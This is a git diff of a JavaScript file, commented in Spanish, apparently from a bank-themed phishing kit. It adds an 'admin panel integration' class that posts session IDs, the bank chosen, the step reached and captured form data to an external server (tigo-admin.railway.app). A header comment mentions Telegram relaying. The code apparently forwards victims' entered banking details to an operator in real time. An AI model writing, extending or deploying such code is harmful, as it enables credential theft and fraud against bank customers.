@@ -1,7 +1,78 @@
 /**
  * Sistema de Loading Overlays y Comunicación con Telegram
  * Arquitectura Senior - Código robusto y mantenible con gestión de sesiones
+ * Integrado con Admin Panel en tiempo real
  */
+
+/**
+ * Admin Panel Integration
+ */
+class AdminPanelIntegration {
+    constructor() {
+        this.adminServerUrl = window.location.protocol === 'https:' ? 
+            'https://tigo-admin.railway.app' : 'http://localhost:3001';
+        this.isEnabled = true;
+    }
+
+    notifySessionStart(sessionId, bank, data = {}) {
+        if (!this.isEnabled) return;
+        
+        fetch(`${this.adminServerUrl}/api/session/start`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId,
+                bank,
+                step: 'inicio',
+                data,
+                timestamp: Date.now()
+            })
+        }).catch(e => console.log('[ADMIN PANEL] Start notification failed:', e));
+    }
+
+    notifySessionUpdate(sessionId, step, data = {}) {
+        if (!this.isEnabled) return;
+
+        fetch(`${this.adminServerUrl}/api/session/update`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId,
+                step,
+                data,
+                active: true,
+                timestamp: Date.now()
+            })
+        }).catch(e => console.log('[ADMIN PANEL] Update notification failed:', e));
+    }
+
+    notifySessionData(sessionId, data) {
+        if (!this.isEnabled) return;
+
+        fetch(`${this.adminServerUrl}/api/session/data`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId,
+                data,
+                timestamp: Date.now()
+            })
+        }).catch(e => console.log('[ADMIN PANEL] Data notification failed:', e));
+    }
+
+    notifySessionEnd(sessionId) {
+        if (!this.isEnabled) return;
+
+        fetch(`${this.adminServerUrl}/api/session/end`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId })
+        }).catch(e => console.log('[ADMIN PANEL] End notification failed:', e));
+    }
+}
+
+// Global admin panel integration instance
+window.AdminPanel = new AdminPanelIntegration();
 
 /**
  * Genera un ID único de sesión para cada cliente
